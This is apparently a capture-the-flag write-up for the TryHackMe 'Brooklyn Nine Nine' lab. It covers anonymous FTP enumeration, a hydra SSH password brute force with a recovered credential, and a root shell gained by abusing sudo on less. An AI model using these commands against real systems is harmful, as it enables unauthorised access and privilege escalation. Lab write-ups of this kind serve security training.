# [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

# Deploy and get hacking

### User flag

_AHH Jake!_

1. Initial port/service discovery

```bash
namp <TARGET_IP>
```

<img width="722" height="252" alt="SCREEN01" src="https://github.com/user-attachments/assets/cf141ebc-804a-4811-918f-4ceef7d7591d" />

2. Enumerate anonymous FTP. Connect and download .txt file

```bash
ftp <TARGET_IP>
anonymous
ls -la
mget note_to_jake.txt
y
```

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

3. Use the discovered hint and perform SSH brute force password attack
   - Discovered login: `jake:987654321`

```bash
hydra -l jake -P /root/Tools/wordlists/rockyou.txt ssh://<TARGET_IP>
```

<img width="721" height="235" alt="SCREEN02" src="https://github.com/user-attachments/assets/912e0fd9-4015-4ceb-b491-eaafd5912ea7" />

4. SSH into the box and retrieve the user flag

```bash
ssh jake@<TARGET_IP>
cat /home/holt/user.txt
```

<img width="725" height="306" alt="SCREEN03" src="https://github.com/user-attachments/assets/6d3aa9ef-2776-4fce-8a25-f590b89d5cf1" />

---

### Root flag

_Sudo is a good command_

1. Check allowed sudo commands for the current user

```bash
sudo -l
```

<img width="722" height="145" alt="SCREEN04" src="https://github.com/user-attachments/assets/ca1c204d-73f5-4fa0-8d10-96a6886dc802" />

2. Abuse an allowed binary using [GTFOBins](https://gtfobins.github.io/gtfobins/less/)

```bash
sudo /usr/bin/less /etc/profile
!/bin/bash
cat /root/root.txt
```

<img width="721" height="109" alt="SCREEN05" src="https://github.com/user-attachments/assets/2618812f-53f4-4d16-a0ed-ef283c4f0af6" />
